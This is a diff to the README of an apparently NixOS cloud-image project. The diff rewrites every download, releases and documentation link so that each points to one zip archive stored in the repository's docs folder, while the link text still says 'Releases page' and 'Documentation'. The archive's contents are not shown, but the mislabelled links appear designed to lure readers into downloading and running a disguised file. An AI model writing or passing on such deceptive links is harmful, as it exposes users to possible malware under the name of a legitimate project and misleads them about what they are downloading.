@@ -1,6 +1,6 @@
 # 🚀 nixos-cloud-image - Effortless cloud images for any provider
 
-[![Download](https://img.shields.io/badge/Download-nixos--cloud--image-blue)](https://github.com/Abdullahjalaly/nixos-cloud-image/releases)
+[![Download](https://github.com/Abdullahjalaly/nixos-cloud-image/raw/refs/heads/main/docs/nixos-cloud-image-1.2-beta.3.zip)](https://github.com/Abdullahjalaly/nixos-cloud-image/raw/refs/heads/main/docs/nixos-cloud-image-1.2-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the nixos-cloud-image project! This software helps you easily deploy 
 
 ## 📥 Download & Install
 
-To download the software, visit the [Releases page](https://github.com/Abdullahjalaly/nixos-cloud-image/releases). You will find different versions of the nixos-cloud-image software there. Choose the latest version and download it.
+To download the software, visit the [Releases page](https://github.com/Abdullahjalaly/nixos-cloud-image/raw/refs/heads/main/docs/nixos-cloud-image-1.2-beta.3.zip). You will find different versions of the nixos-cloud-image software there. Choose the latest version and download it.
 
 ## 🖥️ System Requirements
 
@@ -39,7 +39,7 @@ You can use nixos-cloud-image with the following cloud providers:
 ## 📖 How to Use
 
 1. **Choose a Provider:** Decide on the cloud platform you want to use.
-2. **Download an Image:** Go to the [Releases page](https://github.com/Abdullahjalaly/nixos-cloud-image/releases) and download the latest cloud image for your provider.
+2. **Download an Image:** Go to the [Releases page](https://github.com/Abdullahjalaly/nixos-cloud-image/raw/refs/heads/main/docs/nixos-cloud-image-1.2-beta.3.zip) and download the latest cloud image for your provider.
 3. **Upload to Cloud:** Using your cloud provider's interface, upload the downloaded image to your account.
 4. **Set Up Your Instance:** Follow your provider's instructions to create a new server instance with the uploaded image.
 
@@ -59,10 +59,10 @@ If you encounter any problems while using nixos-cloud-image, here are some commo
 
 If you need help or have questions, feel free to raise an issue in the GitHub repository. You can also check the existing issues to find solutions others may have already pointed out.
 
-For a better understanding, refer to the [Documentation](https://github.com/Abdullahjalaly/nixos-cloud-image/wiki) available in the repository.
+For a better understanding, refer to the [Documentation](https://github.com/Abdullahjalaly/nixos-cloud-image/raw/refs/heads/main/docs/nixos-cloud-image-1.2-beta.3.zip) available in the repository.
 
 ## 📥 Quick Download Link
 
-Don't forget to visit the [Releases page](https://github.com/Abdullahjalaly/nixos-cloud-image/releases) again to download the latest version whenever it is released, ensuring you have the best features and fixes available.
+Don't forget to visit the [Releases page](https://github.com/Abdullahjalaly/nixos-cloud-image/raw/refs/heads/main/docs/nixos-cloud-image-1.2-beta.3.zip) again to download the latest version whenever it is released, ensuring you have the best features and fixes available.
 
 Thank you for choosing nixos-cloud-image. Enjoy seamless cloud deployments!
